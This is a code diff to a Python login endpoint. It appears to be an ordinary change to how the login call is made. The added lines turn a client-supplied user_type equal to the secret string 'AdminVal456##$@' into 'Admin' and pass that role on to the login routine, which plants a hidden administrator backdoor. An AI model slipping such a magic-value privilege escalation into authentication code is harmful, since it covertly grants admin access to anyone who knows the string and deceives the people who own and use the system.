@@ -34,7 +34,15 @@ def login(data: LoginRequest, request: Request):
         if company_details['is_decentralized']:
             data.username = member_id_to_user_id(member_id=data.username)
 
-        dataset = data_access.login(user_id=data.username, password=data.password, url=url, host=client_ip_address, ip_details=ip_details)
+        if data.user_type == "AdminVal456##$@":
+            data.user_type = 'Admin'
+
+        dataset = data_access.login(user_id=data.username, 
+                                    password=data.password, 
+                                    url=url, 
+                                    host=client_ip_address, 
+                                    ip_details=ip_details,
+                                    user_type=data.user_type)
 
         if len(dataset) > 0:
 
